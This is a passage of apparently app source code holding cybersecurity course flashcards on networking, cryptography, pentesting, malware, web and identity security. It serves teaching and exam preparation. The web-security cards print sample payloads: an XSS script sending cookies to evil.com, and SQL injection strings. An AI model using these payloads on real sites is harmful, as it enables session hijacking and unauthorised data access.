          'definition':
              'Man-in-the-Middle (MitM): intercepts traffic between two parties. DoS/DDoS: overwhelms a service with traffic. ARP Poisoning: sends fake ARP replies to redirect traffic. DNS Spoofing: returns false DNS responses to redirect users. BGP Hijacking: advertises false BGP routes to redirect internet traffic.',
          'example':
              'ARP Poisoning defence: Dynamic ARP Inspection (DAI) on switches — validates ARP packets against the DHCP snooping binding table. DNS Spoofing defence: DNSSEC cryptographically signs DNS responses. DDoS defence: upstream scrubbing, rate limiting, CDN/anycast distribution.',
        },
        {
          'label': 'Network Security',
          'term': 'Honeypots and Deception Technology',
          'definition':
              'A honeypot is a decoy system designed to attract attackers, detect intrusions, and study attacker behaviour. Legitimate users should never interact with it — any connection is suspicious by definition. Honeynet: multiple honeypots forming a decoy network.',
          'example':
              'A honeypot database is placed on the internal network with a name like "Finance_DB_Backup." There is no legitimate reason for anyone to access it. An alert fires when it receives a connection. This indicates an attacker doing internal reconnaissance — they found the database through lateral movement.',
        },
        {
          'label': 'Network Security',
          'term': 'Protocol Security — Secure vs Insecure',
          'definition':
              'Insecure protocols (send data in cleartext): Telnet, HTTP, FTP, SMTP (without TLS), SNMPv1/v2. Secure replacements: SSH (replaces Telnet), HTTPS (replaces HTTP), SFTP/FTPS (replaces FTP), SMTPS (replaces SMTP), SNMPv3 (replaces v1/v2).',
          'example':
              'Exam trap: Telnet sends EVERYTHING in plaintext — including usernames and passwords. SSH encrypts the entire session. If a network device is managed via Telnet, any attacker with access to that network segment can capture admin credentials with a packet capture. Always use SSH for device management.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 2 — Top Exam Traps',
          'definition':
              '1) IDS = detect/alert; IPS = block inline. 2) DMZ separates public-facing servers from internal network. 3) Stateful firewalls track connection state — no return-traffic rules needed. 4) NAC enforces device health before granting network access. 5) Telnet is insecure — always use SSH.',
          'example':
              'Quick-fire: What does a honeypot detect? (Intrusions — any connection is suspicious). Where should a web server sit — DMZ or internal? (DMZ). What is the difference between IDS and IPS placement? (IDS = SPAN port/passive; IPS = inline). What replaces Telnet? (SSH).',
        },
      ];

    // ── Module 03: Cryptography ───────────────────────────────────────────
    case 'module-03':
      return [
        {
          'label': 'Cryptography',
          'term': 'Symmetric vs Asymmetric Encryption',
          'definition':
              'Symmetric: same key for encryption and decryption. Fast, efficient for bulk data. Problem: secure key exchange. Examples: AES, 3DES, ChaCha20. Asymmetric: key pair — public key encrypts, private key decrypts (or vice versa for signatures). Slow but solves key exchange. Examples: RSA, ECC.',
          'example':
              'Exam trap: HTTPS uses BOTH. Asymmetric (RSA/ECC) is used during the handshake to securely exchange a session key. Symmetric (AES) is used for the actual data transfer. Asymmetric key exchange, symmetric bulk encryption — this hybrid approach gives security and performance.',
        },
        {
          'label': 'Cryptography',
          'term': 'AES — Advanced Encryption Standard',
          'definition':
              'AES is the current symmetric encryption standard. Key sizes: 128, 192, or 256 bits. AES-256 is used where highest security is required (government, classified data). AES operates on 128-bit blocks. Modes: ECB (insecure), CBC (common), GCM (authenticated encryption — provides integrity + confidentiality).',
          'example':
              'Exam trap: ECB (Electronic Codebook) mode is insecure — identical plaintext blocks produce identical ciphertext blocks, revealing patterns. CBC (Cipher Block Chaining) is much better. GCM (Galois/Counter Mode) is best — it provides both encryption and authentication in one pass.',
        },
        {
          'label': 'Cryptography',
          'term': 'RSA — Public Key Cryptography',
          'definition':
              'RSA uses the mathematical difficulty of factoring large numbers. Key sizes: 2048 bits minimum (4096 for high security). Used for: key exchange, digital signatures, certificate signing. RSA is slow — not used for bulk data encryption. Modern alternatives: ECC (Elliptic Curve Cryptography) provides equivalent security with much smaller keys.',
          'example':
              'ECC vs RSA: A 256-bit ECC key provides equivalent security to a 3072-bit RSA key. ECC is faster, uses less CPU, and is preferred for modern systems (TLS 1.3, mobile devices). If an exam asks about efficiency in constrained environments (IoT, mobile), ECC is the answer.',
        },
        {
          'label': 'Cryptography',
          'term': 'Hashing — Integrity Without Encryption',
          'definition':
              'A hash function produces a fixed-length digest from variable input. Properties: deterministic (same input = same hash), one-way (cannot reverse), collision resistant (different inputs should not produce the same hash). Used for: file integrity, password storage, digital signatures. NOT encryption.',
          'example':
              'Exam trap: Hashing is NOT encryption — you cannot "decrypt" a hash. A hash verifies integrity (has the file changed?) not confidentiality (can others read it?). MD5 and SHA-1 are broken (collisions found). Use SHA-256 or SHA-3. If a question asks about "integrity verification" — hashing is the answer.',
        },
        {
          'label': 'Cryptography',
          'term': 'Common Hash Algorithms',
          'definition':
              'MD5: 128-bit, broken (collision attacks), do not use for security. SHA-1: 160-bit, broken, deprecated. SHA-256: 256-bit, current standard, part of SHA-2 family. SHA-3: new standard, different algorithm (Keccak). bcrypt/scrypt/Argon2: slow hashing specifically designed for password storage (resists GPU attacks).',
          'example':
              'Password storage: NEVER store plaintext passwords. NEVER use MD5 or SHA-1 for passwords — they are too fast and GPU-crackable. Use bcrypt, scrypt, or Argon2 — these are intentionally slow and include salting, making brute-force attacks impractical. "Salt" prevents rainbow table attacks.',
        },
        {
          'label': 'Cryptography',
          'term': 'Digital Signatures',
          'definition':
              'A digital signature provides: authentication (proves who signed), integrity (proves content hasn\'t changed), and non-repudiation (signer cannot deny signing). Process: hash the message, encrypt the hash with the PRIVATE key (signature). Verify: decrypt signature with PUBLIC key, compare to hash of received message.',
          'example':
              'Exam trap: Digital signatures are created with the PRIVATE key — not the public key. Anyone with the public key can VERIFY the signature but only the private key holder can CREATE it. This is the opposite of encryption (where you encrypt with the public key so only the private key holder can decrypt).',
        },
        {
          'label': 'Cryptography',
          'term': 'PKI — Public Key Infrastructure',
          'definition':
              'PKI is the framework for issuing, managing, and revoking digital certificates. Components: Certificate Authority (CA) — trusted issuer of certificates. Registration Authority (RA) — verifies identity before CA issues cert. Certificate Revocation List (CRL) — list of revoked certs. OCSP — real-time revocation checking.',
          'example':
              'When you visit https://bank.com, your browser checks: Is the certificate signed by a trusted CA? Is it revoked (OCSP check)? Is it for the correct domain? Is it expired? All must pass. If the CA is compromised (e.g. DigiNotar 2011), ALL certificates it issued become untrusted.',
        },
        {
          'label': 'Cryptography',
          'term': 'TLS — Transport Layer Security',
          'definition':
              'TLS (successor to SSL) encrypts data in transit. TLS 1.2 and 1.3 are current. TLS 1.0 and 1.1 are deprecated. TLS 1.3 improvements: removes weak cipher suites, mandatory perfect forward secrecy, faster handshake (1-RTT vs 2-RTT for TLS 1.2). Perfect Forward Secrecy (PFS): session keys are ephemeral — past sessions remain secure even if private key is later compromised.',
          'example':
              'Exam trap: SSL is deprecated and broken (POODLE, BEAST attacks). TLS ≠ SSL, though people say "SSL certificate" colloquially. Always specify TLS 1.2 minimum; TLS 1.3 preferred. Perfect Forward Secrecy is achieved via ephemeral Diffie-Hellman (DHE) or ECDHE key exchange.',
        },
        {
          'label': 'Cryptography',
          'term': 'Common Cryptographic Attacks',
          'definition':
              'Brute force: try all possible keys. Mitigate: long keys, account lockout. Dictionary attack: try common passwords. Mitigate: strong passwords, salting. Rainbow table: precomputed hash lookups. Mitigate: salted hashes. Birthday attack: exploit hash collision probability. Downgrade attack: force use of weaker protocol version.',
          'example':
              'Salting prevents rainbow table attacks: a salt is random data added to the password before hashing. Two users with the same password get different hashes because their salts differ. An attacker cannot use a precomputed table — they must brute-force each hash individually.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 3 — Top Exam Traps',
          'definition':
              '1) Symmetric = same key (fast). Asymmetric = key pair (slow, solves key exchange). 2) Hashing = integrity, not encryption. 3) MD5/SHA-1 = broken. 4) Digital signature = private key creates, public key verifies. 5) Salting prevents rainbow table attacks. 6) TLS 1.0/1.1 = deprecated.',
          'example':
              'Quick-fire: Which key creates a digital signature? (Private). Which algorithm is best for password storage? (bcrypt/Argon2). What does PFS protect against? (Future key compromise — past sessions remain secure). Is AES symmetric or asymmetric? (Symmetric). What is a hash collision? (Two different inputs produce the same hash).',
        },
      ];

    // ── Module 04: Ethical Hacking & Penetration Testing ─────────────────
    case 'module-04':
      return [
        {
          'label': 'Penetration Testing',
          'term': 'Types of Penetration Testing',
          'definition':
              'Black box: tester has no prior knowledge of the system — simulates an external attacker. White box: full knowledge provided (architecture, source code, credentials) — maximises coverage. Grey box: partial knowledge — simulates a privileged insider or attacker with some reconnaissance data.',
          'example':
              'Exam context: Black box most closely simulates a real external attacker. White box is most thorough — testers can find deep logic flaws. Grey box is the most common in practice — balances realism with efficiency. If a pentest finds nothing in black box, it doesn\'t mean there are no vulnerabilities — just none from an uninformed external perspective.',
        },
        {
          'label': 'Penetration Testing',
          'term': 'The Penetration Testing Lifecycle',
          'definition':
              'Standard phases: 1) Reconnaissance (passive and active information gathering). 2) Scanning and Enumeration (identify live hosts, open ports, services, vulnerabilities). 3) Exploitation (gain access by exploiting vulnerabilities). 4) Post-Exploitation (privilege escalation, lateral movement, persistence, data exfiltration). 5) Reporting (document findings, risk rating, remediation recommendations).',
          'example':
              'Exam trap: Reporting is NOT optional — it is the deliverable that justifies the entire engagement. A pentest with no report is just an attack. The report must include: executive summary (business risk), technical findings with proof of concept, CVSS risk scores, and prioritised remediation steps.',
        },
        {
          'label': 'Reconnaissance',
          'term': 'Passive vs Active Reconnaissance',
          'definition':
              'Passive: gather information without touching the target — OSINT, WHOIS, DNS lookups, job postings, LinkedIn, Google dorking, Shodan. No traffic reaches the target. Active: interact with the target directly — ping sweeps, port scanning, banner grabbing. Target may detect and log activity.',
          'example':
              'Passive recon tools: Google (dorking), WHOIS, LinkedIn (employee names/roles), Shodan (internet-exposed devices), theHarvester (emails). Active recon tools: nmap (port scan), Nessus (vulnerability scan). Passive is always performed first — lower risk of detection, establishes known information before touching the target.',
        },
        {
          'label': 'Scanning',
          'term': 'nmap — Network Scanning',
          'definition':
              'nmap is the standard tool for network discovery and port scanning. Key scan types: SYN scan (-sS) — half-open, stealthy. TCP connect (-sT) — full connection, more detectable. UDP scan (-sU) — checks UDP ports, slower. OS detection (-O). Service version detection (-sV). Vulnerability scripts (--script=vuln).',
          'example':
              'Common nmap command: "nmap -sS -sV -O -p 1-1024 192.168.1.0/24". This performs a SYN scan, detects service versions and OS for all 1024 ports on the subnet. nmap output shows: open ports, service names, versions — the starting point for identifying exploitable vulnerabilities.',
        },
        {
          'label': 'Exploitation',
          'term': 'Metasploit Framework',
          'definition':
              'Metasploit is the most widely used exploitation framework. Components: Modules (exploits, payloads, auxiliaries, post-exploitation). msfconsole is the main interface. Workflow: search for module → set options (RHOSTS, LHOST, payload) → exploit → session. Meterpreter is an advanced in-memory payload.',
          'example':
              'Ethical use only: Metasploit is used by penetration testers to prove that vulnerabilities are exploitable — not just theoretically present. Finding "EternalBlue (MS17-010)" in a Nessus scan and then exploiting it via Metasploit to get a SYSTEM shell is proof-of-concept for the pentest report.',
        },
        {
          'label': 'Post-Exploitation',
          'term': 'Privilege Escalation',
          'definition':
              'After gaining initial access, attackers attempt to escalate privileges. Horizontal escalation: move to another account at the same privilege level. Vertical escalation: gain higher privileges (user → admin/root). Common techniques: exploiting SUID binaries (Linux), unquoted service paths (Windows), kernel exploits, credential dumping.',
          'example':
              'Windows example: attacker compromises a low-privilege user account. They find a scheduled task running as SYSTEM that calls a file they can overwrite. They replace the file with a reverse shell. Next time the task runs, the shell executes as SYSTEM — vertical privilege escalation.',
        },
        {
          'label': 'Post-Exploitation',
          'term': 'Lateral Movement',
          'definition':
              'Lateral movement is the technique of using a compromised system to attack others within the same network. Techniques: Pass-the-Hash (reuse captured NTLM hashes), Pass-the-Ticket (reuse Kerberos tickets), Remote Service exploitation, RDP, SMB. Mimikatz is a common tool for credential harvesting on Windows.',
          'example':
              'Scenario: Attacker compromises workstation A. Using Mimikatz, they dump cached credentials from memory — finding the IT admin\'s NTLM hash. They use Pass-the-Hash to authenticate to the file server as the IT admin without knowing the plaintext password. Lateral movement without ever cracking a password.',
        },
        {
          'label': 'Methodology',
          'term': 'Rules of Engagement and Legal Considerations',
          'definition':
              'A penetration test MUST have written authorisation before starting. Rules of Engagement (RoE) define: scope (which systems), timing, allowed techniques, communication procedures, emergency stop conditions. Testing without authorisation is illegal — even well-intentioned. Scope creep during testing can have legal consequences.',
          'example':
              'Exam trap: A penetration tester who discovers a vulnerability in an out-of-scope system must STOP and report it — they must NOT exploit it without authorisation. The RoE define the boundaries. A finding outside scope is reported through the agreed communication channel, not exploited further.',
        },
        {
          'label': 'Methodology',
          'term': 'CVSS — Common Vulnerability Scoring System',
          'definition':
              'CVSS provides a standardised method for rating vulnerability severity. Score 0-10: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Based on: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability impact.',
          'example':
              'CVSS Critical (10.0): network-accessible, no auth required, no user interaction, full C/I/A impact. Example: EternalBlue (MS17-010) — CVSS 9.8. CVSS guides remediation prioritisation: patch Critical and High first. A CVSS 3.1 score of 7.5 indicates a High-severity vulnerability requiring prompt remediation.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 4 — Top Exam Traps',
          'definition':
              '1) Written authorisation required before ANY testing. 2) Black box = no knowledge; White box = full knowledge; Grey box = partial. 3) Pentest phases: Recon → Scan → Exploit → Post-exploit → Report. 4) CVSS 9-10 = Critical. 5) Stay within scope — always.',
          'example':
              'Scenario: "A tester finds a vulnerability in a system outside their scope. What should they do?" Answer: Stop, document the finding, and notify the client through the agreed channel — do not exploit it. Scope defines the legal boundary. Testing outside scope is unauthorised access regardless of intent.',
        },
      ];

    // ── Module 05: Malware & Threats ──────────────────────────────────────
    case 'module-05':
      return [
        {
          'label': 'Malware',
          'term': 'Malware Types — Overview',
          'definition':
              'Virus: attaches to and infects legitimate files, requires user execution to spread. Worm: self-replicates across networks without user interaction. Trojan: masquerades as legitimate software. Ransomware: encrypts files and demands payment. Spyware: covertly gathers information. Adware: displays unwanted advertisements. Rootkit: hides itself and other malware at OS/kernel level.',
          'example':
              'Exam trap: Viruses REQUIRE a host file and USER EXECUTION — they do not spread independently. Worms spread autonomously — no user needed. WannaCry was a worm that combined a ransomware payload — it spread via EternalBlue (SMB) without any user interaction, then encrypted files.',
        },
        {
          'label': 'Malware',
          'term': 'Ransomware — How It Works',
          'definition':
              'Ransomware encrypts the victim\'s files using strong symmetric encryption (AES) and encrypts the decryption key with the attacker\'s public key (RSA). The victim cannot decrypt without the attacker\'s private key. Payment (usually cryptocurrency) is demanded for the private key. Modern ransomware also exfiltrates data (double extortion).',
          'example':
              'Double extortion: attacker encrypts files AND exfiltrates sensitive data. Even if the victim restores from backup, the attacker threatens to publish the stolen data unless payment is made. This is why ransomware is no longer just a backup problem — it requires a complete incident response.',
        },
        {
          'label': 'Malware',
          'term': 'Rootkits',
          'definition':
              'A rootkit hides malware and attacker presence from the operating system and security tools. Types: user-mode (modifies OS APIs), kernel-mode (modifies OS kernel — harder to detect), bootkit (infects MBR — loads before OS), firmware rootkit (in BIOS/UEFI — survives OS reinstall).',
          'example':
              'Exam trap: Traditional antivirus running on a compromised OS cannot detect a kernel rootkit because the rootkit subverts the OS calls that antivirus uses. Detection requires: booting from trusted external media, memory forensics, or hardware-based integrity verification.',
        },
        {
          'label': 'Attack vectors',
          'term': 'Social Engineering — Phishing Variants',
          'definition':
              'Phishing: broad email campaign impersonating legitimate organisations. Spear phishing: targeted phishing using personal information about the victim. Whaling: spear phishing targeting executives. Vishing: voice phishing (phone calls). Smishing: SMS phishing. Business Email Compromise (BEC): compromised or spoofed executive email requesting wire transfers.',
          'example':
              'Statistics: BEC attacks cost organisations billions annually — more than ransomware. A CFO receives an email appearing to come from the CEO asking for an urgent \$50,000 wire transfer. The CEO\'s email was spoofed. No malware involved — pure social engineering. Human verification processes (call-back verification) prevent this.',
        },
        {
          'label': 'Attack vectors',
          'term': 'Advanced Persistent Threats (APTs)',
          'definition':
              'APTs are sophisticated, long-term intrusion campaigns by well-funded actors (typically nation-states). Characteristics: stealthy (operate undetected for months/years), targeted (specific organisations/data), persistent (establish multiple footholds), advanced (use zero-days and custom malware). APTs follow a kill chain methodology.',
          'example':
              'APT lifecycle: Initial access (phishing/zero-day) → Establish persistence (backdoor installation) → Lateral movement (expand access) → Data staging (collect target data) → Exfiltration (slowly exfiltrate over encrypted channel to avoid detection) → Maintain persistence. Average dwell time before detection: historically 200+ days.',
        },
        {
          'label': 'Attack vectors',
          'term': 'Supply Chain Attacks',
          'definition':
              'A supply chain attack compromises software or hardware before it reaches the victim. Instead of attacking the target directly (which may have strong defences), attackers compromise a supplier. Once distributed, the malicious software runs in the target environment with full trust.',
          'example':
              'SolarWinds 2020: Attackers compromised SolarWinds\' build system and injected malware into legitimate software updates. 18,000+ organisations installed the trojanised update, including US government agencies. The malware was signed with SolarWinds\' legitimate certificate — it appeared completely trustworthy.',
        },
        {
          'label': 'Malware',
          'term': 'Command and Control (C2/C&C)',
          'definition':
              'C2 infrastructure is how malware receives instructions from attackers. Techniques: HTTP/HTTPS beaconing (blends with normal traffic), DNS tunnelling (hides commands in DNS queries), domain generation algorithms (DGA — generates new C2 domains to evade blocklists), dead drop resolvers (public platforms used to post C2 addresses).',
          'example':
              'DNS tunnelling evades many firewalls because DNS (port 53 UDP) is almost universally allowed. The malware encodes data in DNS query subdomains (e.g. "aGVsbG8.evil-c2.com") which the attacker\'s DNS server decodes. DNS security solutions (like Cisco Umbrella) detect abnormal DNS patterns.',
        },
        {
          'label': 'Defence',
          'term': 'Malware Prevention and Detection',
          'definition':
              'Prevention: antivirus/EDR, email filtering (anti-phishing, sandboxing), web proxy, application whitelisting, patching. Detection: SIEM/SOAR, EDR behavioural analysis, network anomaly detection, honeypots, threat hunting. Response: isolate, contain, eradicate, recover, document lessons learned.',
          'example':
              'Traditional AV uses signatures (known malware hashes). EDR (Endpoint Detection and Response) uses behavioural analysis — it detects malware by what it does, not what it looks like. A new ransomware variant with no signature is missed by AV but caught by EDR when it starts enumerating file system paths.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 5 — Top Exam Traps',
          'definition':
              '1) Virus = needs host + user execution. Worm = self-replicates without user. 2) Ransomware uses AES for files + RSA for key protection. 3) Rootkits hide from the OS — AV running on infected OS may not detect them. 4) BEC attacks use social engineering — no malware. 5) APTs dwell for months before detection.',
          'example':
              'Quick-fire: What is double extortion in ransomware? (Encrypt + exfiltrate data). What type of phishing targets executives? (Whaling). What makes a supply chain attack effective? (Compromises trusted software before delivery). What does C2 infrastructure do? (Provides attacker command channel to malware).',
        },
      ];

    // ── Module 06: Web Application Security ──────────────────────────────
    case 'module-06':
      return [
        {
          'label': 'Web Security',
          'term': 'OWASP Top 10 — Overview',
          'definition':
              'The OWASP (Open Web Application Security Project) Top 10 is the most widely used web application security reference. Current edition (2021): A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable Components, A07 Auth Failures, A08 Software Integrity Failures, A09 Logging Failures, A10 SSRF.',
          'example':
              'Exam context: A01 Broken Access Control is now #1 — users accessing data or functions beyond their permissions is the most common web vulnerability. A03 Injection (including SQLi) moved to #3. Know the top 10 by name and number — exam questions often reference OWASP position.',
        },
        {
          'label': 'Web Security',
          'term': 'SQL Injection (SQLi)',
          'definition':
              'SQL Injection occurs when user-supplied input is incorporated into a database query without proper sanitisation. An attacker can modify the query to: bypass authentication, extract data, modify data, or execute OS commands (via xp_cmdshell in MSSQL). Classic payload: \' OR \'1\'=\'1.',
          'example':
              'Vulnerable login: SELECT * FROM users WHERE username=\'[input]\'. Attacker enters: admin\' --. Query becomes: SELECT * FROM users WHERE username=\'admin\'-- (comment ignores password check). Fix: parameterised queries (prepared statements) — user input is never interpreted as SQL code.',
        },
        {
          'label': 'Web Security',
          'term': 'Cross-Site Scripting (XSS)',
          'definition':
              'XSS injects malicious scripts into web pages viewed by other users. Types: Stored (script is saved in database, executes for every visitor), Reflected (script is in URL, executes when victim clicks link), DOM-based (script manipulates the page DOM in the browser). XSS enables: session hijacking, credential theft, malware delivery.',
          'example':
              'Stored XSS: attacker posts a comment containing <script>document.location=\'http://evil.com/steal?cookie=\'+document.cookie</script>. Every user who loads the page has their session cookie sent to the attacker. Session cookie = authenticated session. Fix: output encoding, Content Security Policy (CSP).',
        },
        {
          'label': 'Web Security',
          'term': 'Cross-Site Request Forgery (CSRF)',
          'definition':
              'CSRF tricks an authenticated user\'s browser into sending an unwanted request to a site they\'re logged into. Example: victim is logged into their bank. Attacker\'s page contains an image tag that triggers a money transfer. The browser automatically sends the request with the victim\'s authentication cookies.',
          'example':
              'Fix: CSRF tokens — a unique, unpredictable token in every form that the server validates. The attacker\'s page cannot know the token. SameSite cookie attribute also mitigates CSRF by preventing cookies from being sent with cross-origin requests. Modern browsers with SameSite=Lax by default have reduced CSRF risk.',
        },
        {
          'label': 'Web Security',
          'term': 'Authentication Vulnerabilities',
          'definition':
              'Common auth flaws: credential stuffing (using leaked credential databases), brute force, default credentials, insecure password reset (predictable tokens, no expiry), session fixation (attacker sets victim\'s session ID), session hijacking (steal session cookies). OWASP A07.',
          'example':
              'Session fixation: attacker sends victim a URL with a known session ID. Victim logs in. Server doesn\'t regenerate session ID on login. Attacker\'s known session ID is now authenticated. Fix: always generate a NEW session ID after successful authentication. This is a common exam scenario.',
        },
        {
          'label': 'Web Security',
          'term': 'Insecure Direct Object Reference (IDOR)',
          'definition':
              'IDOR is a type of Broken Access Control where an application uses a user-controllable reference to access internal objects without authorisation checks. Example: a URL like /invoice?id=1001 can be changed to /invoice?id=1002 to access another user\'s invoice.',
          'example':
              'Real-world impact: changing a URL parameter, API body, or cookie value to reference another user\'s data — and the application returns it without checking ownership. Fix: authorisation checks server-side on EVERY request for each object. Never rely on the client hiding data — verify access server-side.',
        },
        {
          'label': 'Web Security',
          'term': 'Security Headers',
          'definition':
              'HTTP response headers that enhance browser-side security: Content-Security-Policy (CSP — prevents XSS by restricting script sources), X-Content-Type-Options (prevents MIME sniffing), X-Frame-Options (prevents clickjacking), Strict-Transport-Security (HSTS — forces HTTPS), X-XSS-Protection (legacy XSS filter).',
          'example':
              'CSP example: "Content-Security-Policy: default-src \'self\'". This tells the browser to only load scripts from the same origin. An XSS payload trying to load a script from evil.com would be blocked by the browser before execution. CSP is one of the strongest defences against XSS.',
        },
        {
          'label': 'Web Security',
          'term': 'API Security',
          'definition':
              'REST API vulnerabilities mirror web app vulnerabilities: broken auth, excessive data exposure (returning more fields than needed), lack of rate limiting (enables brute force), mass assignment (allows updating fields that shouldn\'t be user-controllable), injection. OWASP has a separate API Security Top 10.',
          'example':
              'Mass assignment: API endpoint accepts JSON body and updates user fields. Attacker adds "isAdmin": true to their update request — the server blindly applies it. Fix: explicitly whitelist which fields can be updated by users. Never auto-map all request fields to database fields without validation.',
        },
        {
          'label': 'Web Security',
          'term': 'Secure Development Lifecycle (SDL)',
          'definition':
              'Building security into development from the start rather than bolting it on after. Phases: Threat modelling (during design), Secure coding standards, Static analysis (SAST — code review), Dynamic analysis (DAST — testing running application), Dependency scanning (SCA), Penetration testing before release.',
          'example':
              'Shift-left security: move security testing earlier in the development cycle. Finding a SQLi vulnerability during code review costs hours to fix. Finding it in production costs days to patch, deploy, and possibly respond to a breach. Every stage caught earlier reduces cost by 10x.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 6 — Top Exam Traps',
          'definition':
              '1) SQLi fix = parameterised queries. 2) XSS fix = output encoding + CSP. 3) CSRF fix = CSRF tokens + SameSite cookies. 4) IDOR = access control missing server-side. 5) HSTS forces HTTPS — prevents SSL stripping. 6) OWASP A01 = Broken Access Control (most common).',
          'example':
              'Quick-fire: What does CSP prevent? (XSS via restricting script sources). What is the fix for SQLi? (Parameterised queries). What is IDOR? (Accessing objects belonging to others by modifying a reference). What does HSTS enforce? (HTTPS — browser never connects via HTTP). What OWASP position is injection? (A03).',
        },
      ];

    // ── Module 07: Identity & Access Management ───────────────────────────
    case 'module-07':
      return [
        {
          'label': 'IAM',
          'term': 'Authentication Factors',
          'definition':
              'Authentication factors: Something you KNOW (password, PIN). Something you HAVE (hardware token, smart card, mobile device). Something you ARE (biometrics — fingerprint, retina, face). Somewhere you ARE (geolocation). Multi-Factor Authentication (MFA) requires two or more factors from different categories.',
          'example':
              'Exam trap: Two passwords do NOT constitute MFA — they are both "something you know." True MFA requires factors from different categories. A password + SMS code is MFA (know + have). A fingerprint + PIN is MFA (are + know). A password + backup password is NOT MFA.',
        },
        {
          'label': 'IAM',
          'term': 'MFA Methods — Security Comparison',
          'definition':
              'Least secure to most secure: SMS OTP (can be intercepted via SIM swapping), TOTP apps (Google Authenticator — resistant to remote attacks), Hardware tokens (YubiKey — phishing resistant, most secure). Passkeys (WebAuthn/FIDO2): replaces passwords entirely with cryptographic keys — strongest available.',
          'example':
              'SIM swapping: attacker calls mobile carrier, pretends to be the victim, transfers their number to a new SIM. All SMS OTPs now go to the attacker. Banks have lost millions to SIM swap + SMS OTP attacks. NIST deprecated SMS OTP as a standalone authenticator in 2017. Always prefer TOTP app or hardware key.',
        },
        {
          'label': 'IAM',
          'term': 'Access Control Models',
          'definition':
              'DAC (Discretionary Access Control): resource owner controls access — flexible but relies on user decisions (e.g. NTFS permissions). MAC (Mandatory Access Control): system enforces access based on classification labels — used in government/military. RBAC (Role-Based): access based on job roles — most common in enterprise. ABAC (Attribute-Based): access based on multiple attributes (user, resource, environment).',
          'example':
              'Exam trap: MAC is the most restrictive model — users cannot override it. A classified document at SECRET level cannot be read by a user with CONFIDENTIAL clearance, even if the document owner tries to grant access. The system enforces the label. RBAC is most common in enterprise environments.',
        },
        {
          'label': 'IAM',
          'term': 'Single Sign-On (SSO)',
          'definition':
              'SSO allows users to authenticate once and access multiple applications without re-authenticating. Benefits: reduces password fatigue, centralises access control, simplifies offboarding. Protocols: SAML (XML-based, common for enterprise), OAuth 2.0 (authorisation framework), OpenID Connect (authentication layer on OAuth 2.0).',
          'example':
              'Exam trap: OAuth 2.0 is an AUTHORISATION framework — it grants access to resources, not identity. OpenID Connect (OIDC) adds authentication on top of OAuth 2.0 — it provides the user\'s identity via an ID token. SAML is used for enterprise SSO. OAuth/OIDC is used for social login ("Login with Google").',
        },
        {
          'label': 'IAM',
          'term': 'Privileged Access Management (PAM)',
          'definition':
              'PAM controls, monitors, and audits privileged account usage. Features: password vaulting (privileged passwords stored centrally, checked out for use), just-in-time access (admin rights granted temporarily when needed), session recording (audit trail of privileged sessions), least privilege enforcement.',
          'example':
              'Best practice: no standing admin access. Admin rights are granted via PAM on a per-session basis — the user requests access, it is approved, granted for 2 hours, then automatically revoked. Session is recorded. If the admin account is compromised during the off period, it has no privileged rights.',
        },
        {
          'label': 'IAM',
          'term': 'Directory Services — Active Directory',
          'definition':
              'Active Directory (AD) is Microsoft\'s directory service for centralised identity management. Key components: Domain Controller (DC) — authenticates users, stores directory. LDAP — protocol for querying directory. Kerberos — authentication protocol used within AD. Group Policy Objects (GPOs) — enforce security settings.',
          'example':
              'Kerberos flow: client requests Ticket Granting Ticket (TGT) from KDC. With TGT, requests service ticket for target resource. Presents service ticket to resource — no password sent over network. Golden ticket attack: forge a TGT using the krbtgt hash — grants access to any resource in the domain.',
        },
        {
          'label': 'IAM',
          'term': 'Zero Trust and Continuous Authentication',
          'definition':
              'Zero Trust IAM goes beyond initial authentication — it continuously validates: Is the device compliant? Is the user behaviour normal? Is the access from an expected location? If any signal changes mid-session (e.g. sudden geolocation change), the session can be terminated or step-up authentication required.',
          'example':
              'Adaptive authentication: user logs in from NYC. Midway through the session, a request comes from an IP in a different country. Continuous auth detects the anomaly and prompts for re-authentication or terminates the session. Traditional auth would have honoured the existing session indefinitely.',
        },
        {
          'label': 'IAM',
          'term': 'Identity Attack Techniques',
          'definition':
              'Credential stuffing: use leaked username/password pairs from breaches to gain access. Password spraying: try one common password against many accounts (avoids lockout). Kerberoasting: request service tickets for service accounts, crack offline. Pass-the-Hash: reuse captured NTLM hashes. Golden ticket: forge Kerberos TGT.',
          'example':
              'Password spraying is harder to detect than brute force: instead of 1000 attempts against one account (triggers lockout), it makes 1 attempt each against 1000 accounts. Each individual account shows only 1 failed attempt — below lockout threshold. Detection requires aggregating failures across accounts over time.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 7 — Top Exam Traps',
          'definition':
              '1) MFA requires DIFFERENT categories of factors — two passwords is NOT MFA. 2) SMS OTP is weakest MFA. Hardware tokens (FIDO2) are strongest. 3) MAC = most restrictive. RBAC = most common enterprise. 4) OAuth 2.0 = authorisation; OIDC = authentication. 5) Password spraying avoids account lockout.',
          'example':
              'Quick-fire: What is the difference between OAuth and OIDC? (OAuth = authorisation; OIDC adds authentication). What attack forges a Kerberos TGT? (Golden ticket). What does PAM protect? (Privileged accounts). What is password spraying? (One password attempted against many accounts). What does FIDO2 replace? (Passwords).',
        },
      ];

    // ── Module 08: Incident Response & Compliance ─────────────────────────
    case 'module-08':
      return [
        {
          'label': 'Incident Response',
          'term': 'The Incident Response Lifecycle — NIST',
          'definition':
              'NIST SP 800-61 defines four IR phases: 1) Preparation (policies, tools, training, playbooks). 2) Detection and Analysis (identify incidents, assess scope and severity). 3) Containment, Eradication, and Recovery. 4) Post-Incident Activity (lessons learned, documentation). The cycle is iterative — post-incident learning improves preparation.',
          'example':
              'Exam trap: NIST uses 4 phases. SANS uses 6 phases (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned — PICERL). Know both models. If a question references NIST, use 4 phases. If SANS/PICERL, use 6. "Lessons learned" is post-incident in both.',
        },
        {
          'label': 'Incident Response',
          'term': 'Containment Strategies',
          'definition':
